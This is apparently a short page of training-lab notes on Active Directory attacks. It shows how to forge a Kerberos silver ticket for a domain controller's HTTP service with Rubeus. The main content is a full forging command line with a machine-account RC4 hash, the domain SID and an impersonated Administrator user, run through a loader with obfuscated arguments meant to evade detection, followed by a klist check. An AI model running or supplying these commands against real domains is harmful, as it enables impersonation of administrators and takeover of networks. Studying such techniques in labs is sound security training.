# 🎫 Command execution on other DC via silver ticket on HTTP & WMI

From the information gathered in previous steps we have the hash for machine account of the domain controller (dcorp-dc$). Using the below command, we can create a Silver Ticket that provides us access to the HTTP service of DC

Please note that the hash of dcorp-dc$ (RC4 in the below command) may be different in the lab. You can also use aes256 keys in place of NTLM hash:

First we start by encoding "silver" then we throw in rubeus ->

```
C:\AD\Tools\Loader.exe -path C:\AD\Tools\Rubeus.exe -args %Pwn% /service:http/dcorp-dc.dollarcorp.moneycorp.local /rc4:4e9815869d2090ccfca61c1fe0d23986 /sid:S-1-5-21-719815819-3726368948-3917688648 /ldap /user:Administrator /domain:dollarcorp.moneycorp.local /ptt
```

<figure><img src="../../.gitbook/assets/image (1116).png" alt=""><figcaption></figcaption></figure>

<figure><img src="../../.gitbook/assets/image (1117).png" alt=""><figcaption></figcaption></figure>

We can check if we go the correct service ticket but first we need to encode "klist":

We can check if we go the correct service ticket:

```
C:\AD\Tools\Loader.exe -path C:\AD\Tools\Rubeus.exe -args %Pwn%
```

<figure><img src="../../.gitbook/assets/image (1118).png" alt=""><figcaption></figcaption></figure>
